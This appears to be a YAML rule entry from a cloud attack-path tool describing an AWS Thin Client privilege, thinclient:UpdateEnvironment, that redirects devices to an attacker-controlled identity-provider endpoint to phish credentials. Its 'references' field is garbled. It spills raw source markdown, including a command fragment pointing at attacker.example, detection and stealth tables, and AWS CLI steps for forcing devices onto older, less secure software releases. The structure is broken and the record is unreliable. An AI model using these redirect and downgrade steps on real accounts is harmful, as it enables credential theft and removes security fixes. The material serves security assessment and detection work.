- id: aws-s05-thinclientupdateenvironment-redirect-devices-to-another-desktop-provid
  provider: aws
  service: thinclient
  title: '`thinclient:UpdateEnvironment` - Redirect devices to another desktop provider or IdP endpoint'
  source: src/pentesting-cloud/aws-security/aws-post-exploitation/aws-workspaces-thin-client-post-exploitation/README.md#thinclientupdateenvironment---redirect-devices-to-another-desktop-provider-or-idp-endpoint
  source_revision: 0b36331
  summary: The source may obtain Victim IdP credential submitted to redirected endpoint when the exact documented prerequisite is verified.
  requires:
    all_of:
    - action: thinclient:UpdateEnvironment
      resource: '*'
  target:
    kind: aws_verified_authority
    selector:
      aws_challenge_fact: aws-s05-thinclientupdateenvironment-redirect-devices-to-another-desktop-provid
    scope: same_account
    aggregate_as: Verified Victim IdP credential submitted to redirected endpoint in {account}
    grants:
    - Victim IdP credential submitted to redirected endpoint
  conditions:
  - id: exact_verified_prerequisites
    description: Exact WorkSpaces Applications environment accepts changed desktopEndpoint; registered user follows attacker-controlled IdP login URL and submits a credential. Compatible same-Region provider and victim interaction are required. Existing exclusion omits the documented credential-phishing consequence. Missing or unverified evidence is UNKNOWN and must not emit a definite edge.
  blockers:
  - scp_or_boundary_deny
  confidence: conditional
  severity: high
  mitigation: Restrict the listed action on the exact resource and remove unnecessary access.
  references:
  - "https://attacker.example/idp/login' \\\n  --region <region>\n```\n\nDo not assume that changing `desktopArn` grants control over the destination. If the attacker does not already operate the IdP or destination provider, this may cause only denial of service. End-user impact requires a registered device and a user session; control-plane success alone does not prove that credentials were captured.\n\n<details>\n<summary>Logs generated, detection, and stealth</summary>\n\n| Signal | Detail |\n| --- | --- |\n| CloudTrail | `UpdateEnvironment` under `thinclient.amazonaws.com`, `managementEvent:true`, `readOnly:false`, with the environment ID in `requestParameters` |\n| Request detail | CloudTrail records the environment ID and changed fields, but treats `desktopEndpoint` as sensitive and redacts its value |\n| Configuration | `GetEnvironment` and configuration inventory expose the changed `desktopArn`, endpoint and `updatedAt` value |\n| Endpoint/device | Devices start using the changed\
    \ destination; authentication failures and a new domain/certificate are independent indicators |\n| Stealth | **Medium**: one management event is generated and the destination is enumerable, but the endpoint value is redacted in the CloudTrail request |\n\n</details>\n\n## Security control bypass\n\n### Software-set writes - Pin or force a less secure device release\n\n**Minimum permissions:**\n\n- `thinclient:UpdateSoftwareSet` on the exact software-set ARN to change its validation state; and\n- `thinclient:UpdateEnvironment` on the exact environment ARN to target every device in the environment, or `thinclient:UpdateDevice` on an exact device ARN to target one device.\n\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": \"thinclient:UpdateSoftwareSet\",\n      \"Resource\": \"arn:aws:thinclient:<region>:<account-id>:softwareset/<software-set-id>\"\n    },\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": \"\
    thinclient:UpdateEnvironment\",\n      \"Resource\": \"arn:aws:thinclient:<region>:<account-id>:environment/<environment-id>\"\n    }\n  ]\n}\n```\n\nReplace the second statement with `thinclient:UpdateDevice` and a `device/<device-id>` ARN for a single-device change.\n\n**Prerequisites:** An existing registered environment or device and an AWS-published software set that the service still permits the target to install. The attacker cannot upload arbitrary firmware through this API. AWS automatically updates expired releases, so pinning an old version is bounded by the release's `supportedUntil` lifecycle.\n\n**Impact:** The attacker can approve a release, switch an environment or device from `USE_LATEST` to a chosen older supported release, and request immediate installation. This can interrupt active sessions and temporarily remove security fixes that only exist in newer Thin Client OS/Chromium software. Marking a needed release `NOT_VALIDATED` can also interfere with an administrator's\
    \ rollout. This is defense degradation and availability impact, not AWS IAM privilege escalation.\n\nReview component versions and support dates before selecting a target:\n\n```bash\naws workspaces-thin-client list-software-sets --region <region>\naws workspaces-thin-client get-software-set \\\n  --id <software-set-id> \\\n  --region <region>\n```\n\nValidate and select a release for every device in an environment:\n\n```bash\naws workspaces-thin-client update-software-set \\\n  --id <software-set-id> \\\n  --validation-status VALIDATED \\\n  --region <region>\n\naws workspaces-thin-client update-environment \\\n  --id <environment-id> \\\n  --software-set-update-mode USE_DESIRED \\\n  --desired-software-set-id <software-set-id> \\\n  --software-set-update-schedule APPLY_IMMEDIATELY \\\n  --region <region>\n```\n\nOr target one device:\n\n```bash\naws workspaces-thin-client update-device \\\n  --id <device-id> \\\n  --desired-software-set-id <software-set-id> \\\n  --software-set-update-schedule\
    \ APPLY_IMMEDIATELY \\\n  --region <region>\n```\n\nRestore the original validation status, update mode, desired release and schedule after a temporary change. Do not force an update on a production device with an active user session.\n\n<details>\n<summary>Logs generated, detection, and stealth</summary>\n\n| Signal | Detail |\n| --- | --- |\n| CloudTrail | `UpdateSoftwareSet` plus `UpdateEnvironment` or `UpdateDevice` under `thinclient.amazonaws.com`; these are management events with `readOnly:false` |\n| Configuration | Software-set `validationStatus`; environment/device desired and pending set IDs; update mode/schedule; and `updatedAt` timestamps |\n| Device | Version/compliance changes, reboot or session interruption when an immediate install is applied |\n| Lifecycle | A desired version older than the newest validated release or near `supportedUntil` is a high-signal discrepancy |\n| Stealth | **Low** for an immediate deployment because it is user-visible and produces multiple\
    \ durable changes; **medium** for a maintenance-window pin that is not reconciled regularly |\n\n</details>\n\n## References\n\n- [UpdateEnvironment API](https://docs.aws.amazon.com/workspaces-thin-client/latest/api/API_UpdateEnvironment.html"
